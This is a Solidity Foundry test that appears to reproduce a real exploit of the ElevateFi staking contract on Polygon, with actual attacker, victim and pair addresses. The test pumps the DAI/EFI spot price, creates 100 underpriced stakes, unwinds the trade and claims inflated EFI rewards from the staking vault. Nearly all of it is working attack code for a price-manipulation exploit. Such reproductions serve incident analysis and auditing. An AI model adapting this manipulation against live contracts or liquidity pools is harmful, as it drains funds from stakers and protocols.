// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~16,000 USD
// Attacker : 0x7abd3f84e28f49f8f3d64fa21981fa36e4fb37f0
// Attack Contract / Execution Address : 0x7abd3f84e28f49f8f3d64fa21981fa36e4fb37f0
// EIP-7702 Authorized Code : 0x0511889ef593412386a889a3b7e3327cbc81f19e
// Vulnerable Contract : 0xcddc83a34fc9a7b9e6b1df7c14b585cf73283174
// Victim : 0x816ec92012e61269dcfe72188fe6d2352defce74
// Attack Tx : https://polygonscan.com/tx/0x2bd7213a764dd93d18dedeca7f4e0cf5c3cdce1739d79b53e41b72ec9efed87e

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0xcddc83a34fc9a7b9e6b1df7c14b585cf73283174#code

// @Analysis
// Telegram : https://t.me/defimon_alerts/3040
//
// ElevateFi priced fixed-USD staking packages from the raw DAI/EFI pair reserves. This PoC funds the attacker
// with DAI to isolate the victim bug, pumps the pair spot price, creates 100 underpriced package-7 stakes, then
// advances one epoch and claims EFI from the staking vault. The real tx sourced the DAI through nested flash loans
// and executed from the attacker EOA through EIP-7702 authorized code.

address constant ATTACKER = 0x7abD3f84E28f49f8F3d64Fa21981fA36E4Fb37f0;
address constant ELEVATE_STAKING_PROXY = 0x816EC92012e61269dcFe72188fe6d2352dEFCe74;
address constant EFI = 0xae840dEab9916d80FADF42E218119a6051468169;
address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;
address constant DAI_EFI_PAIR = 0xAec86dc2a08CD7cF8d90eE71d0E4864F25BA497B;

interface IElevateStaking {
    function rebase() external;
    function stakeEFI(
        uint8 packageId
    ) external;
    function viewStakeRewards(
        address user
    ) external view returns (uint256 totalUsd);
    function claimStakeRewards(
        uint256 usdAmount
    ) external returns (uint256 paidEfi, uint256 burnedEfi);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 87_132_216;
        vm.createSelectFork("polygon", forkBlock);
        vm.roll(87_132_217);
        vm.warp(1_779_221_088);

        fundingToken = EFI;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ELEVATE_STAKING_PROXY, "ElevateFi staking proxy");
        vm.label(EFI, "EFI");
        vm.label(DAI, "DAI");
        vm.label(DAI_EFI_PAIR, "DAI/EFI pair");
    }

    function testExploit() public balanceLog {
        uint256 efiBefore = IERC20(EFI).balanceOf(ATTACKER);

        // The real tx got this buying power from nested DAI flash loans. Here it is setup capital so the PoC
        // focuses on ElevateFi's vulnerable reserve-price dependency.
        uint256 daiSeed = 1_360_000 ether;
        deal(DAI, ATTACKER, daiSeed);

        vm.startPrank(ATTACKER, ATTACKER);

        // step 1: pump the DAI/EFI pair spot price used by ElevateFi's getPriceUSD().
        buyEfiWithAllDai();

        // step 2: create the same package-7 stakes while the reserve-derived EFI price is inflated.
        uint256 stakeCount = 100;
        for (uint256 i = 0; i < stakeCount; ++i) {
            IElevateStaking(ELEVATE_STAKING_PROXY).stakeEFI(7);
        }

        // step 3: unwind the local price manipulation before claiming rewards.
        sellRemainingEfi();

        vm.stopPrank();

        uint256 vaultBeforeClaim = IERC20(EFI).balanceOf(ELEVATE_STAKING_PROXY);

        // step 4: advance to the observed claim block and claim one epoch of inflated staking rewards.
        vm.roll(87_132_251);
        vm.warp(1_779_221_148);
        vm.startPrank(ATTACKER, ATTACKER);
        IElevateStaking(ELEVATE_STAKING_PROXY).rebase();
        uint256 rewards = IElevateStaking(ELEVATE_STAKING_PROXY).viewStakeRewards(ATTACKER);
        IElevateStaking(ELEVATE_STAKING_PROXY).claimStakeRewards(rewards);
        vm.stopPrank();

        uint256 efiProfit = IERC20(EFI).balanceOf(ATTACKER) - efiBefore;
        uint256 vaultEfiLoss = vaultBeforeClaim - IERC20(EFI).balanceOf(ELEVATE_STAKING_PROXY);

        assertGt(efiProfit, 6200 ether, "EFI reward profit");
        assertEq(vaultEfiLoss, efiProfit, "staking vault paid attacker");
    }

    function buyEfiWithAllDai() private {
        IUniswapV2Pair pair = IUniswapV2Pair(DAI_EFI_PAIR);
        uint256 daiIn = IERC20(DAI).balanceOf(ATTACKER);

        IERC20(DAI).transfer(DAI_EFI_PAIR, daiIn);
        (uint256 reserveDai, uint256 reserveEfi) = daiEfiReserves(pair);
        uint256 efiOut = getAmountOut(daiIn, reserveDai, reserveEfi);
        pair.swap(0, efiOut, ATTACKER, "");
    }

    function sellRemainingEfi() private {
        IUniswapV2Pair pair = IUniswapV2Pair(DAI_EFI_PAIR);
        uint256 pairEfiBefore = IERC20(EFI).balanceOf(DAI_EFI_PAIR);

        IERC20(EFI).transfer(DAI_EFI_PAIR, IERC20(EFI).balanceOf(ATTACKER));
        uint256 netEfiIn = IERC20(EFI).balanceOf(DAI_EFI_PAIR) - pairEfiBefore;
        (uint256 reserveDai, uint256 reserveEfi) = daiEfiReserves(pair);
        uint256 daiOut = getAmountOut(netEfiIn, reserveEfi, reserveDai);
        pair.swap(daiOut, 0, ATTACKER, "");
    }

    function daiEfiReserves(
        IUniswapV2Pair pair
    ) private view returns (uint256 reserveDai, uint256 reserveEfi) {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        if (pair.token0() == DAI) {
            return (uint256(reserve0), uint256(reserve1));
        }
        return (uint256(reserve1), uint256(reserve0));
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }
}
